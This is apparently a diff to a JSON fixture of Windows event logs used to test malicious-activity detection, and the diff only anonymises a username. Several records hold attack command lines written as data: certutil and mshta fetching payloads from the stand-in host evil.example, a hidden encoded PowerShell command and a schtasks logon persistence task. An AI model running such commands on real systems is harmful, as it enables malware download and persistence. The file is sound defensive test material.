@@ -10,7 +10,7 @@
       "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA...",
       "ParentProcessGuid": "pp1", "ParentProcessId": 500,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -23,7 +23,7 @@
       "CommandLine": "powershell.exe -File C:\\Scripts\\update-inventory.ps1",
       "ParentProcessGuid": "pp1", "ParentProcessId": 500,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -38,7 +38,7 @@
       "ParentProcessGuid": "pp2", "ParentProcessId": 700,
       "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
       "ParentCommandLine": "\"WINWORD.EXE\" /n \"invoice.docm\"",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -52,7 +52,7 @@
       "ParentProcessGuid": "pp2", "ParentProcessId": 700,
       "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
       "ParentCommandLine": "\"WINWORD.EXE\" /n \"report.docx\"",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -63,11 +63,11 @@
       "EventID": 1, "TimeCreated": "2026-08-20T10:04:00+00:00", "Computer": "TESTHOST",
       "ProcessGuid": "p5", "ProcessId": 1005,
       "Image": "C:\\Windows\\System32\\cmd.exe",
-      "CommandLine": "cmd.exe /c C:\\Users\\evan\\Downloads\\invoice.exe",
+      "CommandLine": "cmd.exe /c C:\\Users\\<user>\\Downloads\\invoice.exe",
       "ParentProcessGuid": "pp3", "ParentProcessId": 800,
       "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
       "ParentCommandLine": "chrome.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -81,7 +81,7 @@
       "ParentProcessGuid": "pp3", "ParentProcessId": 800,
       "ParentImage": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
       "ParentCommandLine": "chrome.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -91,7 +91,7 @@
     "raw": {
       "EventID": 4698, "TimeCreated": "2026-08-20T10:06:00+00:00", "Computer": "TESTHOST",
       "TaskName": "\\Microsoft\\Windows\\UpdateOrchestrator\\SysUpdateCheck",
-      "SubjectUserName": "evan"
+      "SubjectUserName": "<user>"
     }
   },
   {
@@ -100,7 +100,7 @@
     "raw": {
       "EventID": 4699, "TimeCreated": "2026-08-20T10:07:00+00:00", "Computer": "TESTHOST",
       "TaskName": "\\OldBackupJob",
-      "SubjectUserName": "evan"
+      "SubjectUserName": "<user>"
     }
   },
   {
@@ -114,7 +114,7 @@
       "CommandLine": "certutil.exe -urlcache -split -f http://evil.example/payload.exe payload.exe",
       "ParentProcessGuid": "pp4", "ParentProcessId": 900,
       "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -127,7 +127,7 @@
       "CommandLine": "certutil.exe -verify C:\\certs\\client.cer",
       "ParentProcessGuid": "pp4", "ParentProcessId": 900,
       "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -137,11 +137,11 @@
     "raw": {
       "EventID": 1, "TimeCreated": "2026-08-20T10:10:00+00:00", "Computer": "TESTHOST",
       "ProcessGuid": "p9", "ProcessId": 1009,
-      "Image": "C:\\Users\\evan\\Downloads\\free_giftcard_generator.exe",
+      "Image": "C:\\Users\\<user>\\Downloads\\free_giftcard_generator.exe",
       "CommandLine": "free_giftcard_generator.exe",
       "ParentProcessGuid": "pp5", "ParentProcessId": 950,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -154,7 +154,7 @@
       "CommandLine": "notepad++.exe",
       "ParentProcessGuid": "pp5", "ParentProcessId": 950,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -168,7 +168,7 @@
       "CommandLine": "mshta.exe http://evil.example/payload.hta",
       "ParentProcessGuid": "pp6", "ParentProcessId": 960,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -181,7 +181,7 @@
       "CommandLine": "mshta.exe C:\\Program Files\\VendorApp\\help.hta",
       "ParentProcessGuid": "pp6", "ParentProcessId": 960,
       "ParentImage": "C:\\Windows\\explorer.exe", "ParentCommandLine": "explorer.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -192,10 +192,10 @@
       "EventID": 1, "TimeCreated": "2026-08-20T10:14:00+00:00", "Computer": "TESTHOST",
       "ProcessGuid": "p13", "ProcessId": 1013,
       "Image": "C:\\Windows\\System32\\schtasks.exe",
-      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\evan\\AppData\\Local\\Temp\\upd.exe /sc onlogon",
+      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\Users\\<user>\\AppData\\Local\\Temp\\upd.exe /sc onlogon",
       "ParentProcessGuid": "pp7", "ParentProcessId": 970,
       "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   },
   {
@@ -208,7 +208,7 @@
       "CommandLine": "schtasks.exe /query /tn Updater",
       "ParentProcessGuid": "pp7", "ParentProcessId": 970,
       "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentCommandLine": "cmd.exe",
-      "User": "TESTHOST\\evan"
+      "User": "TESTHOST\\<user>"
     }
   }
 ]
